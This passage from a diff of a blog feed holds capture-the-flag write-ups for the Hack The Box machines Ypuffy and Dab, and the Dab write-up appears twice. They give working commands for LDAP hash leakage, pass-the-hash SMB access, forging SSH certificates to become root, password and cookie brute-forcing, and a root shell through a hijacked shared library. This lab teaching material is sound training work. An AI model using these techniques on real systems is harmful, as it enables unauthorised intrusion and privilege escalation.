+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---dab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/dab/&quot;&gt;Hack The Box - Dab&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htb Nmap As always we will start with nmap so : nmap -sV -sT -sC ypuffy.htb Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389 It also tells us that we can connect anonymously to ldap. Initial Enumeration Let’s check http first Connection reset. http will be useful later but not now. Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmap smbmap -H ypuffy.htb Access Denied. Let’s check ldap LDAP nmap told us that anonymous authentication was allowed so we will use a tool called ldapsearch ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb Full Output : # extended LDIF # # LDAPv3 # base &amp;lt;dc=hackthebox,dc=htb&amp;gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 we can also use nmap to enumerate ldap , with a script called ldap-search nmap -p 389 --script ldap-search ypuffy.htb Full Output: Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET Nmap scan report for ypuffy.htb (10.10.10.107) Host is up (0.14s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=hackthebox,dc=htb | dn: dc=hackthebox,dc=htb | dc: hackthebox | objectClass: top | objectClass: domain | dn: ou=passwd,dc=hackthebox,dc=htb | ou: passwd | objectClass: top | objectClass: organizationalUnit | dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb | uid: bob8791 | cn: Bob | objectClass: account | objectClass: posixAccount | objectClass: top | userPassword: {BSDAUTH}bob8791 | uidNumber: 5001 | gidNumber: 5001 | gecos: Bob | homeDirectory: /home/bob8791 | loginShell: /bin/ksh | dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb | uid: alice1978 | cn: Alice | objectClass: account | objectClass: posixAccount | objectClass: top | objectClass: sambaSamAccount | userPassword: {BSDAUTH}alice1978 | uidNumber: 5000 | gidNumber: 5000 | gecos: Alice | homeDirectory: /home/alice1978 | loginShell: /bin/ksh | sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 | displayName: Alice | sambaAcctFlags: [U ] | sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 | sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B | sambaPwdLastSet: 1532916644 | dn: ou=group,dc=hackthebox,dc=htb | ou: group | objectClass: top | objectClass: organizationalUnit | dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: bob8791 | userPassword: {crypt}* | gidNumber: 5001 | dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: alice1978 | userPassword: {crypt}* | gidNumber: 5000 | dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb | sambaDomainName: YPUFFY | sambaSID: S-1-5-21-3933741069-3307154301-3557023464 | sambaAlgorithmicRidBase: 1000 | objectclass: sambaDomain | sambaNextUserRid: 1000 | sambaMinPwdLength: 5 | sambaPwdHistoryLength: 0 | sambaLogonToChgPwd: 0 | sambaMaxPwdAge: -1 | sambaMinPwdAge: 0 | sambaLockoutDuration: 30 | sambaLockoutObservationWindow: 30 | sambaLockoutThreshold: 0 | sambaForceLogoff: -1 | sambaRefuseMachinePwdChange: 0 |_ sambaNextRid: 1001 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds The most interesting part is this : We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8B This hash is uncrackable however we can still use it to authenticate. SMB Enumeration We need to list the shares first to know where we can connect. We can use a tool called crackmapexec : crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares There are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$ We can also use smbclient to list the shares : smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/ But it doesn’t tell us which shares do we have access to and which we don’t. So we know that we can access the share alice , let’s connect. smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice There’s only one file called my_private_key.ppk , get my_private_key.ppk to download it. SSH and getting user my_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. On kali I had to get putty-tools first apt-get install putty-tools Then we will use puttygen : puttygen my_private_key.ppk -O private-openssh -o alice.key Now let’s take a look at the key : Last step is to chmod 600 alice.key and finally ssh ssh -i alice.key alice1978@ypuffy.htb And we owned user ! More Enumeration Remember http ? we got a connection reset. Let’s check /etc/httpd.conf We see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot; After some more enumeration , there are 3 users on the box alice1978 , bob8791 and userca bob8791 has a directory called dba Inside it there’s an sql file called sshauth.sql It creates a table called principals and another table called keys If we also check sshd_config in /etc/ssh/ # $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files #IgnoreRhosts yes # To disable tunneled clear text passwords, change to no here! PasswordAuthentication no #PermitEmptyPasswords no # Change to no to disable s/key passwords ChallengeResponseAuthentication no AllowAgentForwarding no AllowTcpForwarding no #GatewayPorts no X11Forwarding no #X11DisplayOffset 10 #X11UseLocalhost yes #PermitTTY yes #PrintMotd yes #PrintLastLog yes #TCPKeepAlive yes #UseLogin no #PermitUserEnvironment no #Compression delayed #ClientAliveInterval 0 #ClientAliveCountMax 3 #UseDNS no #PidFile /var/run/sshd.pid #MaxStartups 10:30:100 #PermitTunnel no #ChrootDirectory none #VersionAddendum none # no default banner path #Banner none # override default of no subsystems Subsystem sftp /usr/libexec/sftp-server # Example of overriding settings on a per-user basis #Match User anoncvs # X11Forwarding no # AllowTcpForwarding no # PermitTTY no # ForceCommand cvs server This part : So that http service is responsible for some ssh authentication stuff , and we can request keys from /sshauth?type=keys&amp;amp;username= and principals from /sshauth?type=principals&amp;amp;username= , requesting keys for root gives us no response , but requesting the principal we get 3m3rgencyB4ckd00r Generating and signing ssh keys , Getting root So now we have root’s principal 3m3rgencyB4ckd00r. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them. The problem is , as alice1978 we are not authorized to do this. On linux we could check if we can run elevated commands with sudo -l but here there’s no sudo , instead of that there’s a command called doas , if we check the config file for it : We can run ssh-keygen as userca without password. First step is to create ssh keys for alice1978 ssh-keygen -t rsa -f /tmp/id_rsa Then we need the certificate (ca) in /home/userca/ so we will cd there And sign the ssh keys we have just created as root doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub -s for certificate , -I for identity and -n for principal Finally we will ssh as root : ssh -i /tmp/id_rsa root@localhost And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Dab</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/ypuffy/0.png" /></entry><entry><title type="html">Hack The Box - Dab</title><link href="http://localhost:4000/hack-the-box/dab/" rel="alternate" type="text/html" title="Hack The Box - Dab" /><published>2019-02-02T00:00:00+02:00</published><updated>2019-02-02T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/dab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/dab/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-dab-retired-and-this-is-my-write-up-dab-was-a-nice-box-a-hard-one-but-it-had-some-funny-stuff-too--getting-user-was-really-annoying-because-it-had-a-lot-of-rabbit-holes-root-was-much-better-its-a-linux-box-and-its-ip-is-10101086-so-lets-jump-right-in&quot;&gt;Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.&lt;/h4&gt;
@@ -331,8 +740,9 @@ system(&quot;/bin/bash&quot;);
 &lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---secnotes&quot;&gt;previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/secnotes/&quot;&gt;Hack The Box - Secnotes&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login suceeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&amp;gt; attack –&amp;gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&amp;gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to get a more clear output cat users.txt | python -m json.tool &amp;gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d '&quot;' -f 2 &amp;gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d '&quot;' -f 2 &amp;gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &amp;lt;stdio.h&amp;gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Secnotes</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/dab/0.png" /></entry><entry><title type="html">Steganography - A list of useful tools and resources</title><link href="http://localhost:4000/lists/stego/" rel="alternate" type="text/html" title="Steganography - A list of useful tools and resources" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/lists/stego</id><content type="html" xml:base="http://localhost:4000/lists/stego/">&lt;hr /&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---secnotes&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/secnotes/&quot;&gt;Hack The Box - Secnotes&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---ypuffy&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ypuffy/&quot;&gt;Hack The Box - Ypuffy&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login suceeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&amp;gt; attack –&amp;gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&amp;gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to get a more clear output cat users.txt | python -m json.tool &amp;gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d '&quot;' -f 2 &amp;gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d '&quot;' -f 2 &amp;gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &amp;lt;stdio.h&amp;gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Secnotes Next Hack The Box write-up : Hack The Box - Ypuffy</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/dab/0.png" /></entry><entry><title type="html">Steganography - A list of useful tools and 